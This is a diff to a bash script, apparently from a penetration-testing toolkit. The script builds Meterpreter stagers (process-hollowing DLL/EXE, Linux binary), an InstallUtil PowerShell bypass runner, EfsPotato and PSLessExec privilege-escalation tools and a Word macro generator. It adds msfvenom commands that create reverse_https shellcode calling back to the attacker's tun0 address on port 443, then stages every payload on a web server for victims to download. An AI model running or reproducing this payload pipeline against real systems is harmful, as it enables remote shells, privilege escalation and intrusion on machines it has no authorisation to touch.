@@ -1,4 +1,6 @@
 #!/bin/bash
+WEBDIR=/var/www/html
+
 set -ex
 IP=`ifconfig tun0 | grep "inet "|awk '{print $2}'`
 echo "Updating IP to $IP"
@@ -9,11 +11,18 @@ python3 generate_win_msf_stager.py --injection hollow --format dll
 python3 generate_win_installutil_ps_runner.py
 python3 generate_msf_linux_exe.py
 python3 generate_win_util_EfsPotato.py
+python3 generate_win_util_PSLessExec.py
+python3 generate_winword_macro.py
 
-sudo mv win_msf_stager.dll /var/www/html/met.dll
-sudo mv win_msf_stager.exe /var/www/html/met.exe
-sudo mv win_installutil_ps_runner.txt /var/www/html/Bypass.txt
-sudo mv msf-linux-x64 /var/www/html/
-sudo mv win_efspotato.exe /var/www/html/EfsPotato.exe
-#sudo mv output_run.txt /var/www/html/run.txt
-sudo mv output_efs.txt /var/www/html/efs.txt
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw -o sc
+msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw -o sc32
+
+sudo mv win_msf_stager.dll ${WEBDIR}/met.dll
+sudo mv win_msf_stager.exe ${WEBDIR}/met.exe
+sudo mv win_installutil_ps_runner.txt ${WEBDIR}/Bypass.txt
+sudo mv msf-linux-x64 ${WEBDIR}/
+sudo mv win_pslessexec.exe ${WEBDIR}/tools/PSLessExec.exe
+sudo mv win_efspotato.exe ${WEBDIR}/EfsPotato.exe
+sudo mv output_efs.txt ${WEBDIR}/efs.txt
+sudo mv sc ${WEBDIR}/sc
+sudo mv sc32 ${WEBDIR}/sc32
